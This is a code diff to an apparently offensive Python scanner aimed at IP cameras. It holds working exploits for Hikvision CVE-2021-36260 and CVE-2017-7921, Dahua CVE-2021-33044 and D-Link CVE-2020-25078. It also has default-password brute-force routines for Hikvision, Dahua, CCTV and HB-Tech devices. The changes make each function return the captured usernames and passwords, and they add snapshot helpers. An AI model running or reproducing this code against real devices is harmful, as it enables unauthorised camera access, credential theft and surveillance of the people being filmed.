@@ -6,20 +6,25 @@ import requests
 CWD = os.path.dirname(__file__)
 sys.path.append(os.path.join(CWD, '..'))
 from utils.net import get_user_agent
+from utils.camera import snapshot_cve_2017_7921, snapshot_rtsp
 
 
 timeout=2
 
 
 def cve_2021_36260(ip: str) -> list:
-    """海康威视任意命令执行漏洞"""
+    """(Hikvision) Arbitrary command execution vulnerability"""
+    if ':' in ip:
+        items = ip.split(':')
+        ip, port = items
+    else: port = 80
     cve_lib = os.path.join(CWD, 'lib/CVE-2021-36260.py')
-    res = os.popen(f"python3 {cve_lib} --rhost {ip} --rport 80 --cmd 'pwd'").readlines()[-2].strip()
-    return [res == '/home', 'Hikvision', 'cve-2021-36260']
+    res = os.popen(f"python3 {cve_lib} --rhost {ip} --rport {port} --cmd 'pwd'").readlines()[-2].strip()
+    return [res == '/home', '', '', 'Hikvision', 'cve-2021-36260']
 
 
 def cve_2017_7921(ip: str) -> list:
-    """海康威视绕过认证漏洞"""
+    """(Hikvision) Bypassing authentication vulnerability"""
     headers = {'User-Agent': get_user_agent()}
     user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
     config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"
@@ -31,30 +36,30 @@ def cve_2017_7921(ip: str) -> list:
             f.write(rc.content)
         info = eval(os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readline().strip())
         idx = - info[::-1].index('admin')
-        info = info[idx - 1: idx - 1 + 4]
+        user, passwd = info[idx - 1], info[idx]
         os.remove(f"{ip}-config")
-        return [True, 'Hikvision', 'cve-2017-7921', str(info)]
-    return [False, 'Hikvision', 'cve-2017-7921']
+        return [True, str(user), str(passwd), 'Hikvision', 'cve-2017-7921']
+    return [False, ]
 
 
 def hik_weak(ip: str, users: list=['admin'], passwords: list=['12345']) -> list:
-    """海康威视弱口令扫描 & 也可使用密码字典进行爆破"""
+    """(Hikvision) Brute"""
     passwords = set(passwords + ['12345'])
     headers = {'User-Agent': get_user_agent()}
     for user in users:
         for p in passwords:
             r = requests.get(f"http://{ip}/PSIA/System/deviceinfo", auth=(user, p), timeout=timeout, verify=False, headers=headers)
             if 'IP CAMERA' in r.text or 'IPCamera' in r.text:
-                return [True, 'Hikvision', 'weak pass', f"{user}:{p}"]
-    return [False, 'Hikvision', 'weak pass']
+                return [True, str(user), str(p), 'Hikvision', 'weak pass']
+    return [False, ]
 
 
 def dahua_weak(ip: str, users: list=['admin'], passwords: list=['admin']) -> list:
-    """大华摄像机弱口令扫描 & 也可使用密码字典进行爆破"""
+    """(Dahua) Brute"""
     passwords = set(passwords + ['admin'])
     headers = {
         'User-Agent': get_user_agent(),
-        'Host': ip,
+        'Host': ip.split(':')[0],
         'Origin': 'http://' + ip,
         'Referer': 'http://' + ip,
         'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -81,15 +86,15 @@ def dahua_weak(ip: str, users: list=['admin'], passwords: list=['admin']) -> lis
             }
             r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
             if r.status_code == 200 and r.json()['result'] == True:
-                return [True, 'Dahua', 'weak pass', f"{user}:{p}"]
-    return [False, 'Dahua', 'weak pass']
+                return [True, str(user), str(p), 'Dahua', 'weak pass']
+    return [False, ]
 
 
 def cve_2021_33044(ip: str) -> list:
-    """大华摄像机绕过认证漏洞"""
+    """(Dahua) Bypassing authentication vulnerability"""
     headers = {
         'User-Agent': get_user_agent(),
-        'Host': ip,
+        'Host': ip.split(':')[0],
         'Origin': 'http://' + ip,
         'Referer': 'http://' + ip,
         'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -114,21 +119,23 @@ def cve_2021_33044(ip: str) -> list:
     }
     r = requests.post(f"http://{ip}/RPC2_Login", headers=headers, json=_json, verify=False, timeout=timeout)
     if r.status_code == 200 and r.json()['result'] == True:
-        return [True, 'Dahua', 'cve-2021-33044']
-    return [False, 'Dahua', 'cve-2021-33044']
+        return [True, '', '', 'Dahua', 'cve-2021-33044']
+    return [False, ]
 
 
 def cve_2020_25078(ip: str) -> list:
-    """DLink摄像头账号密码暴露漏洞"""
+    """(DLink) Brute"""
     headers = {'User-Agent': get_user_agent()}
     r = requests.get(f"http://{ip}/config/getuser?index=0", timeout=timeout, verify=False, headers=headers)
     if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
-        return [True, 'DLink', 'cve-2020-25078', ','.join(r.text.split())]
-    return [False, 'DLink', 'cve-2020-25078']
+        items = r.text.split()
+        user, passwd = items[0].split('=')[1], items[1].split('=')[1]
+        return [True, str(user), str(passwd), 'DLink', 'cve-2020-25078']
+    return [False, ]
 
 
 def cctv_weak(ip: str, users: list=['admin'], passwords: list=['']) -> list:
-    """CCTV摄像机弱口令扫描 & 也可使用密码字典进行爆破"""
+    """(CCTV) Brute"""
     passwords = set(passwords + [''])
     headers = {'User-Agent': get_user_agent()}
     for user in users:
@@ -139,20 +146,20 @@ def cctv_weak(ip: str, users: list=['admin'], passwords: list=['']) -> list:
                 items = r.text.split()
                 idx = items.index('<rpermission')
                 if '0' in items[idx + 1]:
-                    return [True, 'CCTV', 'weak pass', f"{user}:{p}"]
-    return [False, 'CCTV', 'weak pass']
+                    return [True, str(user), str(p), 'CCTV', 'weak pass']
+    return [False, ]
 
 
 def hb_weak(ip: str, users: list=['admin'], passwords: list=['888888']) -> list:
-    """汉邦高科弱口令扫描 & 也可使用密码字典进行爆破"""
+    """(HB Teck / Hikvision<multiplay>) Brute"""
     passwords = set(passwords + ['888888'])
     headers = {'User-Agent': get_user_agent()}
     for user in users:
         for p in passwords:
             r = requests.get(f"http://{ip}/ISAPI/Security/userCheck", verify=False, headers=headers, timeout=timeout, auth=(user, p))
             if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
-                return [True, 'HB-Tech', 'weak pass', f"{user}:{p}"]
-    return [False, 'HB-Tech', 'weak pass']
+                return [True, str(user), str(p), 'HB-Tech/Hikvision', 'weak pass']
+    return [False, ]
 
 
 if __name__ == '__main__':
